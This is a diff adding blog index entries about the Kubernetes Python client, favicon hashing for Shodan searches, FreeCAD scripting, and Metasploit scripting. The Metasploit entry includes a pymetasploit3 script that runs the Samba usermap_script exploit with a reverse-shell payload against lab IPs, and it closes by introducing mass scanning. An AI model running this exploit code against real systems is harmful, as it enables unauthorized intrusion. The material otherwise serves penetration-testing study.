@@ -116,6 +116,230 @@
 	
 	<!-- display as entry -->	
 		<h3 class="title">
+			<div class="date"> 2024-07-21 </div>
+			<div class="article-title"><a href="/blog/2024/07/21/cf60c137-bc18-49af-9985-080e62ba10e8/" title="This article provides a detailed guide on installing the official Kubernetes Python library, setting up configuration paths, and showcasing its usage through code examples. It also includes an example of listing pods&#39; IP addresses across different namespaces using CoreV1Api.">Mastering Kubernetes Python Library: Installation, Configuration, And Pods Listing Examples</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<h1 id="k8s-python-api-library"><a href="#k8s-python-api-library" class="headerlink" title="k8s python api library"></a>k8s python api library</h1><p>install the official library with <code>pip install kubernetes</code></p>
+<hr>
+<p>the default api config path for k8s is at <code>~/.kube/config</code></p>
+<p><code>k3s</code> is at <code>/etc/rancher/k3s/k3s.yaml</code></p>
+<p><code>microk8s</code> is at <code>/var/snap/microk8s/current/credentials/kubelet.config</code></p>
+<p>you can also set <code>KUBECONFIG</code> environment variable to let <code>kubernetes</code> python library know where the config is</p>
+<hr>
+<p>to use it:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kubernetes-client/python/blob/master/kubernetes/README.md">https://github.com/kubernetes-client/python/blob/master/kubernetes/README.md</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kubernetes <span class="keyword">import</span> client, config</span><br><span class="line"><span class="comment"># Configs can be set in Configuration class directly or using helper utility</span></span><br><span class="line">config_path = ...</span><br><span class="line">config.load_kube_config(config_path)</span><br><span class="line">v1 = client.CoreV1Api()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Listing pods with their IPs:&quot;</span>)</span><br><span class="line">ret = v1.list_pod_for_all_namespaces(watch=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ret.items:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s\t%s\t%s&quot;</span> % (i.status.pod_ip, i.metadata.namespace, i.metadata.name))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/07/21/cf60c137-bc18-49af-9985-080e62ba10e8/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
+			<div class="date"> 2024-05-13 </div>
+			<div class="article-title"><a href="/blog/2024/05/13/5a6c512c-fde1-4f09-ab60-f56245fc1df1/" title="This article explains the process of creating a favicon hash using the mmh3 library in Python. It involves making a GET request and hashing the content, which can be utilized with Shodan or ZoomEye to search for websites that have the same favicon.">Favicon Hashes Creation And Usage</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<p>To create favicon hash, run:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perform_get_request_with_insecure_and_redirects</span>(<span class="params">url: <span class="built_in">str</span></span>):</span><br><span class="line">response = requests.get(url, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">True</span>, timeout=<span class="number">15</span>)</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_favicon_url</span>(<span class="params">url: <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/favicon.ico&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_url_and_get_favicon_hash</span>(<span class="params">url: <span class="built_in">str</span></span>):</span><br><span class="line">favicon_url = get_favicon_url(url)</span><br><span class="line">response perform_get_request_with_insecure_and_redirects(favicon_url)</span><br><span class="line">favicon = codecs.encode(response.content, <span class="string">&quot;base64&quot;</span>)</span><br><span class="line">_<span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line">_<span class="built_in">hash</span> = <span class="built_in">str</span>(_<span class="built_in">hash</span>)</span><br><span class="line"><span class="keyword">return</span> _<span class="built_in">hash</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line">icon_hash = process_url_and_get_favicon_hash(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;icon hash for url &#x27;<span class="subst">&#123;url&#125;</span>&#x27;:&quot;</span>, icon_hash)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>You can use favicon hash in Shodan like: <code>http.favicon.hash:&lt;favicon_hash&gt;</code></p>
+<p>In ZoomEye like: <code>iconhash:&quot;&lt;favicon_hash&gt;&quot;</code></p>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/05/13/5a6c512c-fde1-4f09-ab60-f56245fc1df1/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
+			<div class="date"> 2024-05-13 </div>
+			<div class="article-title"><a href="/blog/2024/05/13/6a607b1f-20e8-487c-8f34-166310a7c51b/" title="This article provides an explanation of FreeCAD scripting, specifically focusing on how to manipulate objects and create circles within specified bounds using Python. The article includes examples of defining dimensions and the number of circles needed, as well as calculating side lengths and margins to generate squares with given parameters.">Freecad Python Scripting</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<p>Reference:</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.freecad.org/FreeCAD_Scripting_Basics">https://wiki.freecad.org/FreeCAD_Scripting_Basics</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Part</span><br><span class="line">doc = FreeCAD.ActiveDocument</span><br><span class="line"><span class="comment"># list all objects</span></span><br><span class="line">all_objects = doc.Objects</span><br><span class="line"><span class="comment"># list all names</span></span><br><span class="line">all_object_names = [it.Name <span class="keyword">for</span> it <span class="keyword">in</span> all_objects]</span><br><span class="line"><span class="comment"># get object by name</span></span><br><span class="line">obj = doc.getObject(<span class="string">&quot;myObjectName&quot;</span>)</span><br><span class="line"><span class="comment"># get vertex point</span></span><br><span class="line">vertex_point = obj.Shape.Vertexes[<span class="number">0</span>].Point</span><br><span class="line"><span class="comment"># create new line</span></span><br><span class="line">new_line = Part.makeLine((-<span class="number">200</span>, -<span class="number">200</span>, <span class="number">0</span>), (<span class="number">200</span>, <span class="number">200</span>, <span class="number">0</span>))</span><br><span class="line"><span class="comment"># insert the line</span></span><br><span class="line">Part.show(new_line)</span><br><span class="line"><span class="comment"># recompute the document</span></span><br><span class="line">doc.recompute()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Draw squares within specific bounds:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">margin = <span class="number">15</span></span><br><span class="line"><span class="comment"># Define the dimensions of the square area</span></span><br><span class="line">x_min = -<span class="number">210.134</span> + margin</span><br><span class="line">x_max = -<span class="number">84.134</span> - margin</span><br><span class="line">y_min = -<span class="number">140.0997</span> + margin</span><br><span class="line">y_max = -<span class="number">14.0997</span> - margin</span><br><span class="line">z = <span class="number">0</span></span><br><span class="line"><span class="comment"># Define the number of squares in each row and column</span></span><br><span class="line">num_squares = <span class="number">10</span></span><br><span class="line"><span class="comment"># Calculate the side length of each square</span></span><br><span class="line">x_length = (x_max - x_min) / num_squares</span><br><span class="line">y_length = (y_max - y_min) / num_squares</span><br><span class="line">margin_portion = <span class="number">0.17</span></span><br><span class="line">hole_portion = <span class="number">1</span> - <span class="number">2</span> * margin_portion</span><br><span class="line"><span class="comment"># Create the squares</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_squares):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_squares):</span><br><span class="line">x_start = x_min + i * x_length + x_length * margin_portion</span><br><span class="line">y_start = y_min + j * y_length + y_length * margin_portion</span><br><span class="line">square_points = [</span><br><span class="line">(x_start, y_start, z),</span><br><span class="line">(x_start + x_length * hole_portion, y_start, z),</span><br><span class="line">(x_start + x_length * hole_portion, y_start + y_length * hole_portion, z),</span><br><span class="line">(x_start, y_start + y_length * hole_portion, z),</span><br><span class="line">(x_start, y_start, z), <span class="comment"># to make it closed</span></span><br><span class="line">]</span><br><span class="line">square = Part.makePolygon(square_points)</span><br><span class="line">Part.show(square)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Draw circles with specific bounds:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">margin = <span class="number">15</span></span><br><span class="line"><span class="comment"># Define the dimensions of the square area</span></span><br><span class="line">x_min = -<span class="number">210.134</span> + margin</span><br><span class="line">x_max = -<span class="number">84.134</span> - margin</span><br><span class="line">y_min = -<span class="number">140.0997</span> + margin</span><br><span class="line">y_max = -<span class="number">14.0997</span> - margin</span><br><span class="line">z = <span class="number">0</span></span><br><span class="line"><span class="comment"># Define the number of circles in each row and column</span></span><br><span class="line">num_circles = <span class="number">10</span></span><br><span class="line"><span class="comment"># Calculate the side length of each circle</span></span><br><span class="line">x_length = (x_max - x_min) / num_circles</span><br><span class="line">y_length = (y_max - y_min) / num_circles</span><br><span class="line">margin_portion = <span class="number">0.17</span></span><br><span class="line">radius_portion = <span class="number">0.5</span> - margin_portion</span><br><span class="line">radius = x_length * radius_portion</span><br><span class="line">direction = App.Vector(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># Create the squares</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_circles):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_circles):</span><br><span class="line">x_center = x_min + i * x_length + x_length * <span class="number">0.5</span></span><br><span class="line">y_center = y_min + j * y_length + y_length * <span class="number">0.5</span></span><br><span class="line">circle = Part.makeCircle(radius, App.Vector(x_center, y_center, <span class="number">0</span>), direction)</span><br><span class="line">Part.show(circle)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/05/13/6a607b1f-20e8-487c-8f34-166310a7c51b/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
+			<div class="date"> 2024-03-31 </div>
+			<div class="article-title"><a href="/blog/2024/03/31/a9195f8f-4cd8-4a15-ad6b-782a9b437b0a/" title="This article explains the process of loading resource scripts in Metasploit using Ruby libraries and `Rex::Script::Shell`. It also covers the usage of the Metasploit gem for vulnerability scanning through Python&#39;s pymetasploit3 package. The script interacts with the Metasploit Framework, setting up a background RPC service and loading modules.">Metasploit Scripting And More</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<p>you typically need to do this before importing useful metasploit ruby libraries:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LOAD_PATH</span>.push(<span class="string">&#x27;./lib&#x27;</span>)</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rex&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msfenv&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the way metasploit loads resource script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/msf/base/sessions/command_shell.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_file</span>(<span class="params">full_path, args</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="title class_">File</span>.extname(full_path) == <span class="string">&#x27;.rb&#x27;</span></span><br><span class="line"><span class="title class_">Rex::Script::Shell</span>.new(<span class="variable language_">self</span>, full_path).run(args)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">load_resource(full_path) <span class="comment"># usually *.rc files</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the <code>Shell.new</code>:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lib/rex/shell/base.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args=[]</span>)</span><br><span class="line"><span class="variable language_">self</span>.args = args = args.flatten</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(<span class="symbol">:</span><span class="symbol">:File</span>.read(<span class="variable language_">self</span>.path, <span class="symbol">:</span><span class="symbol">:File</span>.size(<span class="variable language_">self</span>.path)), binding )</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Rex</span><span class="symbol">:</span><span class="symbol">:Script</span><span class="symbol">:</span><span class="symbol">:Completed</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line"><span class="variable language_">self</span>.error = e</span><br><span class="line"><span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the  <code>load_resource</code>:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/rex/ui/text/resource.rb</span></span><br><span class="line"><span class="comment"># -*- coding: binary -*-</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Rex</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Ui</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Text</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Resource</span></span><br><span class="line"><span class="comment"># Processes a resource script file for the console.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> path [String] Path to a resource file to run</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> [void]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_resource</span>(<span class="params">path</span>)</span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">resource_file = <span class="variable">$stdin</span>.read</span><br><span class="line">path = <span class="string">&#x27;stdin&#x27;</span></span><br><span class="line"><span class="keyword">elsif</span> <span class="symbol">:</span><span class="symbol">:File</span>.exist?(path)</span><br><span class="line">resource_file = <span class="symbol">:</span><span class="symbol">:File</span>.read(path)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_error(<span class="string">&quot;Cannot find resource script: <span class="subst">#&#123;path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># Process ERB directives first</span></span><br><span class="line">print_status <span class="string">&quot;Processing <span class="subst">#&#123;path&#125;</span> for ERB directives.&quot;</span></span><br><span class="line">erb = <span class="variable constant_">ERB</span>.new(resource_file)</span><br><span class="line">processed_resource = erb.result(binding)</span><br><span class="line">lines = processed_resource.each_line.to_a</span><br><span class="line">bindings = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line">line.strip!</span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line.length == <span class="number">0</span></span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line =~ <span class="regexp">/^#/</span></span><br><span class="line"><span class="comment"># Pretty soon, this is going to need an XML parser :)</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> case matters for the tag and for binding names</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/&lt;ruby/</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/\s+binding=(?:&#x27;(\w+)&#x27;|&quot;(\w+)&quot;)(&gt;|\s+)/</span></span><br><span class="line">bin = (<span class="variable">$~</span>[<span class="number">1</span>] |<span class="params"></span>| <span class="variable">$~</span>[<span class="number">2</span>])</span><br><span class="line">bindings[bin] = binding <span class="keyword">unless</span> bindings.has_key? bin</span><br><span class="line">bin = bindings[bin]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bin = binding</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> line =~ <span class="regexp">/&lt;\/ruby&gt;/</span></span><br><span class="line">buff &lt;&lt; line</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> ! buff.empty?</span><br><span class="line">print_status(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Code (<span class="subst">#&#123;buff.length&#125;</span> bytes)&quot;</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(buff, bin)</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">raise</span> <span class="variable">$!</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">print_error(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Error: <span class="subst">#&#123;e.<span class="keyword">class</span>&#125;</span> <span class="subst">#&#123;e&#125;</span> <span class="subst">#&#123;e.backtrace&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_line(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; <span class="subst">#&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">run_single(line)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>vulnerability scanners:</p>
+<p><a target="_blank" rel="noopener" href="https://dradis.com/ce/">https://dradis.com/ce/</a></p>
+<p>nessus</p>
+<p>nexpose</p>
+<p>openvas</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://rubygems.org/gems/metasploit-framework">metasploit-framework</a> is a ruby gem.</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.infosecmatter.com/metasploit-module-library/">https://www.infosecmatter.com/metasploit-module-library/</a></p>
+<p><a target="_blank" rel="noopener" href="https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module">https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module</a></p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/mad-metasploit">mad-metasploit</a> custom metasploit scripts</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.offsec.com/metasploit-unleashed/">metasploit unleashed</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/">official metasploit documentation</a></p>
+<hr>
+<p>metasploit has enabled ssl by default. http will not work.</p>
+<p>install package:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pymetasploit3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>launch metasploit background rpc service:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get help</span></span><br><span class="line">msfrpcd -h</span><br><span class="line"><span class="comment"># start background service</span></span><br><span class="line">msfrpcd -P lazero</span><br><span class="line"><span class="comment"># or if you want foreground service</span></span><br><span class="line">msfrpcd -P lazero -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>run script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">PWD = <span class="string">&quot;lazero&quot;</span></span><br><span class="line">custom_module_path = <span class="string">&quot;custom_msf_module&quot;</span></span><br><span class="line"><span class="keyword">assert</span> os.path.exists(custom_module_path), (</span><br><span class="line"><span class="string">&quot;Custom module path not found at: &#x27;%s&#x27;&quot;</span> % custom_module_path</span><br><span class="line">)</span><br><span class="line"><span class="comment"># write custom python modules with:</span></span><br><span class="line"><span class="comment"># https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html</span></span><br><span class="line">client = MsfRpcClient(</span><br><span class="line">password=PWD, ssl=<span class="literal">True</span></span><br><span class="line">)  <span class="comment"># requires ssl by default. otherwise won&#x27;t work</span></span><br><span class="line"><span class="comment"># the module structure must be identical to the one at , otherwise it will not load.</span></span><br><span class="line">client.core.addmodulepath(os.path.abspath(custom_module_path))</span><br><span class="line">exploit_id = <span class="string">&quot;multi/samba/usermap_script&quot;</span></span><br><span class="line">exp_mod = client.modules.use(<span class="string">&quot;exploit&quot;</span>, exploit_id)</span><br><span class="line">RHOST = <span class="string">&quot;172.16.194.172&quot;</span></span><br><span class="line">LHOST = <span class="string">&quot;172.16.194.163&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;RHOST&quot;</span>] = RHOST  <span class="comment"># this host is not running.</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;PAYLOAD&quot;</span>] = <span class="string">&quot;cmd/unix/reverse&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;LHOST&quot;</span>] = LHOST</span><br><span class="line">msf_console = (</span><br><span class="line">client.consoles.console()</span><br><span class="line">)  <span class="comment"># you can manually read/write instead of using below method.</span></span><br><span class="line"><span class="comment"># timeout: 301 seconds.</span></span><br><span class="line">exploit_run_output = msf_console.run_module_with_output(exp_mod)  <span class="comment"># str</span></span><br><span class="line"><span class="built_in">print</span>(exploit_run_output)  <span class="comment"># now have output. but still it is not streaming.</span></span><br><span class="line"><span class="comment"># you may want to overwrite the original implementation. the data is actually produced step by step.</span></span><br><span class="line">run_output_file = <span class="string">&quot;samba_usermap_script_output.log&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(run_output_file, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(exploit_run_output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[metasploit]&quot;</span>, <span class="string">&quot;output file saved at:&quot;</span>, run_output_file)</span><br><span class="line"><span class="comment"># thank you very much.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>To do mass scanning, first we need to obtain the default RPORT for each exploit.</p>
